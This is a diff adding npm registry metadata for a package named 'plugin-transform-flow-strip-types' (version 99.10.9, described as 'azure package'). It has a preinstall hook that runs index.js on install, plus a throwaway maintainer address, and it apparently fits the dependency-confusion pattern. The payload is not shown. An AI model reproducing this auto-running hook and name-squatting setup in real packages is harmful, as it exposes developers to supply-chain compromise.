@@ -1,0 +1,62 @@
+{
+    "_id": "plugin-transform-flow-strip-types",
+    "name": "plugin-transform-flow-strip-types",
+    "dist-tags": {
+        "latest": "99.10.9"
+    },
+    "versions": {
+        "99.10.9": {
+            "name": "plugin-transform-flow-strip-types",
+            "version": "99.10.9",
+            "description": "azure package",
+            "main": "index.js",
+            "scripts": {
+                "test": "echo 'error no test specified' && exit 1",
+                "preinstall": "node index.js"
+            },
+            "author": "",
+            "License": "ISC",
+            "_id": "plugin-transform-flow-strip-types@99.10.9",
+            "_nodeVersion": "16.14.2",
+            "_npmVersion": "8.5.0",
+            "dist": {
+                "integrity": "sha512-Dl9zwAX+P07Bv4ihW8Wrzo9HlYsFW+Pcn9TiQlWHeF018+kD0s3Bc452+fF6pZ13aDugtlHwEEqwaGoFiPM7Lg==",
+                "shasum": "d2c96a220b555087f9314c7ffbba187b9202ba9d",
+                "tarball": "https://registry.npmjs.org/plugin-transform-flow-strip-types/-/plugin-transform-flow-strip-types-99.10.9.tgz",
+                "fileCount": 2,
+                "unpackedSize": 5085,
+                "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiO4zcACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2VmpjSw//UUvLs1U9+H3G9X/Ll5eilLd06Lx+++JwukJj3qiP6bDTCgCi\r\ne+FCf1hB6Ct7+nhfx8oi2CLmt3BsGVLeKPEqqjmFpeC8ZiGkpflqwgMMfx28\r\nfrqfptjg1ovEX0Mu3HtPbBiRvPNeAaUU4c9+GxeDN1W2+b2hwnoMLYJgYlt5\r\nk2lnznduDLLNfkRFdltmnSzwHvhCBGeGGtXKqKuKbYpdfzC0ibj0Zy1ziYu6\r\n+D+wVCucanL9cEKeVGgsK2ZbEETw8Jcvmy6lMhaZ29t4jl3zLYtaZ7HVBmG/\r\n/cSBgViHZIwVLVUjPUnZVtIu0WWUr9Z7XYAp+XNB171DaspXBpplWrvN89w/\r\n+1criq8jlQzu6Dz8+yHQzkZkQuePlfAHDHOQIy4IQyQzFu6ntZgHLyYYc144\r\nk5FmJX2IUiFSbK8aA+pbSItMgZaB9H71xj5dfXZ2OAy+20jUFXBoLDgpSm7O\r\nf2ZArnb+kvbiZ7TAucEQOsYLAswW5aKZlESz8ihI7G47ojT1Ee8RKIiDpST/\r\nknaseeG/pCukzo/MIxMG2M9eFJxrkiMUyhwFZuQYpj6xjiE7/XJTqChHFTHV\r\nP2ccrPEL+wRtO/+RCOfRcKgFHSTf+t4YkOwDzqG6Ou8CLgBQ0QLXuKzG7U6I\r\nrhKrykm7UbfdkE7OfMMihUz4u7cXRQ+1NoQ=\r\n=+tNc\r\n-----END PGP SIGNATURE-----\r\n"
+            },
+            "_npmUser": {
+                "name": "azyok2t2",
+                "email": "azyok2t2@rt11.ml"
+            },
+            "directories": {},
+            "maintainers": [
+                {
+                    "name": "azyok2t2",
+                    "email": "azyok2t2@rt11.ml"
+                }
+            ],
+            "_npmOperationalInternal": {
+                "host": "s3://npm-registry-packages",
+                "tmp": "tmp/plugin-transform-flow-strip-types_99.10.9_1648069852686_0.5499091235647131"
+            },
+            "_hasShrinkwrap": false
+        }
+    },
+    "time": {
+        "created": "2022-03-23T21:10:52.685Z",
+        "99.10.9": "2022-03-23T21:10:52.821Z",
+        "modified": "2022-03-23T21:10:52.919Z"
+    },
+    "maintainers": [
+        {
+            "name": "azyok2t2",
+            "email": "azyok2t2@rt11.ml"
+        }
+    ],
+    "description": "azure package",
+    "readme": "ERROR: No README data found!",
+    "readmeFilename": ""
+}
